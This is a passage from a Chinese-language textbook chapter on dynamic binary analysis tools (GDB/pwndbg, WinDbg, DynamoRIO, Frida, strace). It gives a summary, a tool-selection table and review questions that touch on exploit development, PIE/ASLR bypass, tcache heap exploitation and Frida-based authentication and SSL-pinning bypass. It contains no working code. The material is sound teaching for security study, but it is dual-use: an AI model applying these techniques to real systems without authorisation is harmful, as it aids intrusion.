- 内核结构体查看（!process、!thread、!pool）是深入分析的基石
- TTD 时间旅行调试为复杂崩溃分析提供了革命性的能力

**5. DynamoRIO 动态二进制插桩**
- 基于基本块和跟踪的插桩机制
- 可定制客户端实现指令覆盖率统计、内存访问追踪
- 与 AFL 结合可以在闭源二进制上进行模糊测试

**6. Frida 动态插桩**
- 架构分层清晰（frida-server → frida-core → frida-gum）
- Interceptor.attach 实现函数级别的 Hook
- Memory.scan 支持运行时内存搜索
- 在 Android 应用漏洞分析中有广泛应用（绕过认证、SSL Pinning、反调试）

**7. 系统调用跟踪**
- strace/ltrace 是 Linux 下的经典跟踪工具
- ProcMon 和 API Monitor 是 Windows 平台的系统/API 监控利器
- 通过跟踪文件 I/O、网络、注册表操作可判断程序的真实行为
- 系统调用跟踪在信息泄露和 TOCTOU 漏洞分析中尤为有效

### 选型指南

| 场景 | 推荐工具 | 原因 |
|------|----------|------|
| Linux 用户态漏洞分析 | GDB + pwndbg | 最完整的调试和利用开发支持 |
| Windows 用户态逆向 | x64dbg | 开源、功能强大、性价比高 |
| Windows 内核漏洞分析 | WinDbg | 官方支持、内核调试唯一选择 |
| 闭源二进制代码覆盖率 | DynamoRIO | 无需源码的插桩方案 |
| 移动端/跨平台 Hook | Frida | 跨平台、API 丰富、社区活跃 |
| 系统行为分析 | strace/ProcMon | 轻量级、快速定位异常交互 |

## 6.9 思考题

1. **GDB 调试**：在使用 `step` 和 `next` 频繁调试大型程序时，如何最小化性能开销？在什么场景下应当使用 `finish` 替代 `until`？

2. **栈溢出分析**：给定一个 PIE 开启且 ASLR 开启的 x86-64 二进制文件，使用 GDB 和 pwndbg，描述完整的利用开发流程。如何绕过 PIE 和 ASLR？

3. **硬件断点 vs 软件断点**：当分析通过 INT3 检测反调试的恶意软件时，为什么硬件断点比软件断点更适合？硬件断点的数量限制（4个）如何应对？

4. **堆漏洞分析**：使用 pwndbg 的 `heap` 和 `bins` 命令分析一个 glibc >= 2.35 的程序时，tcache 的变化带来了哪些新的利用约束？如何利用 tcache 的 key 字段检测双重释放？

5. **Frida vs DynamoRIO**：Frida 和 DynamoRIO 都支持动态插桩，但在架构、性能、适用场景上有本质差异。请对比两者的优缺点，并说明在什么情况下应该选择 Frida 而不是 DynamoRIO。

6. **WinDbg 内核调试**：当目标机触发 KERNEL_MODE_EXCEPTION_NOT_HANDLED 蓝屏时，`!analyze -v` 的输出中哪些字段是最关键的？如果 crash address 指向一个未知模块（tag 显示 UNKNOWN），下一步应该如何定位问题？

7. **系统调用跟踪**：使用 strace 分析一个程序时，发现其频繁调用 `mprotect` 将内存页从 `rw-` 改为 `rwx`，这可能暗示什么安全问题？如何进一步分析？

8. **综合应用**：设计一个实验，对一个闭源的 C/S 架构服务端程序进行安全评估。要求使用本章至少两种不同的动态分析技术（例如 GDB + Frida，或 x64dbg + API Monitor），并说明每种技术在此实验中的具体作用。
